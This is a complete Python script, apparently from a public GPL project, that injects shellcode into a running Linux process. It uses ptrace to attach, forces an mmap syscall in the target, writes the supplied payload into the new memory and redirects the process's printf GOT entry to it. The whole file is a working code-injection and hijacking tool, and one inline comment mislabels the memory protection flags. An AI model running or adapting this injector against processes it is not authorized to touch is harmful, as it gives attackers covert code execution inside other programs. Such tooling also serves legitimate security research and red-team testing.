#!/usr/bin/env python3
#
# This file is part of the linux-prinj project.
# https://gitlab.com/pgregoire/linux-prinj/
#
# Copyright 2022 Philippe Grégoire <git@pgregoire.xyz>
#
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

import ctypes

from pwn import *


context.log_level = 'critical'

# -------------------------------------------------------------------- #
# ptrace

libc = None
def loadlibc(path):
    global libc

    libc = ctypes.CDLL(path)

    # ptrace's signature
    libc.ptrace.argtypes = [
        ctypes.c_uint64,
        ctypes.c_uint64,
        ctypes.c_void_p,
        ctypes.c_void_p,
    ]
    libc.ptrace.restype = ctypes.c_uint64


class UserRegsStruct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

def ptrace_attach(pid):
    return libc.ptrace(16, pid, 0, 0)


def ptrace_detach(pid):
    return libc.ptrace(17, pid, 0, 0)


def ptrace_getregs(pid):
    r = UserRegsStruct()
    e = libc.ptrace(12, pid, 0, ctypes.byref(r))
    assert(0 == e)
    return r


def ptrace_setregs(pid, regs):
    e = libc.ptrace(13, pid, 0, ctypes.byref(regs))
    assert(0 == e)


def ptrace_peektext(pid, addr):
    return libc.ptrace(1, pid, addr, 0)


def ptrace_poketext(pid, addr, value):
    return libc.ptrace(4, pid, addr, value)


def ptrace_singlestep(pid):
    libc.ptrace(9, pid, 0, 0)


# helpers
def attach(pid):
    ptrace_attach(pid)
    os.waitpid(pid, 0)


def singlestep(pid):
    ptrace_singlestep(pid)
    os.waitpid(pid, 0)


def wrmem(pid, addr, dat):
    pad = lambda s : (s + (b'\x00' * (8 - (len(dat) % 8))))[:8]

    for i in range(0, len(dat), 8):
        z = u64(pad(dat[i:i+8]))
        ptrace_poketext(pid, addr+i, z)


def rdmem(pid, addr, len):
    r = b''

    for i in range(0, len, 8):
        v = ptrace_peektext(pid, addr+i)
        r += p64(v)

    return r

# -------------------------------------------------------------------- #
# /proc/

def getmaps(pid):
    with open('/proc/{}/maps'.format(pid)) as fp:
        dat = fp.read()

    r = []
    for ln in [e for e in dat.split('\n') if e]:
        s = [e for e in ln.split(' ') if e]
        r += [{
          'addr': s[0],
          'from': int(s[0].split('-')[0], 16),
          'to': int(s[0].split('-')[1], 16),
          'perms': s[1],
          'offset': int(s[2], 16),
          'dev': s[3],
          'devmaj': int(s[3].split(':')[0], 16),
          'devmin': int(s[3].split(':')[1], 16),
          'inode': int(s[4]),
          'path': None if 5 == len(s) else s[5],
        }]

    return r


def findlibc(maps):
    return [m for m in maps if m['path'] and '/libc' in m['path']][0]

# -------------------------------------------------------------------- #

def wrbin(pid, dat):
    r1 = ptrace_getregs(pid)
    r2 = ptrace_getregs(pid)
    ins = ptrace_peektext(pid, r1.rip)

    r2.rax = 9
    r2.rdi = 0
    r2.rsi = len(dat)
    r2.rdx = 5              # PROT_READ | PROT_WRITE
    r2.r10 = 0x22           # MAP_PRIVATE | MAP_ANONYMOUS
    r2.r8  = -1
    r2.r9  = 0

    ptrace_setregs(pid, r2)
    ptrace_poketext(pid, r1.rip, 0x050f) # syscall
    singlestep(pid)
    r2 = ptrace_getregs(pid)
    ptrace_setregs(pid, r1)
    ptrace_poketext(pid, r1.rip, ins)

    wrmem(pid, r2.rax, dat)
    return r2.rax


if 3 != len(sys.argv):
    print('usage: inject <shellcode.bin> <pid>', file=sys.stderr)
    exit(1)


with open(sys.argv[1], 'rb') as fp:
    code = fp.read()
pid = int(sys.argv[2])


maps = getmaps(pid)
libc_map = findlibc(maps)
loadlibc(libc_map['path'])

# assume the first map is the binary
prog_map = maps[0]

try:
    attach(pid)

    libc_elf = ELF(libc_map['path'])
    prog_elf = ELF('/proc/{}/exe'.format(pid))
    func_addr = prog_map['from'] + prog_elf.got['printf']
    print('Hooking got.printf @{}'.format(hex(func_addr)))

    orig_addr = ptrace_peektext(pid, func_addr)
    print('libc.printf is at {}'.format(hex(orig_addr)))
    code_addr = wrbin(pid, p64(orig_addr) + code)

    print('Performing redirection')
    ptrace_poketext(pid, func_addr, code_addr + 8)
finally:
    ptrace_detach(pid)
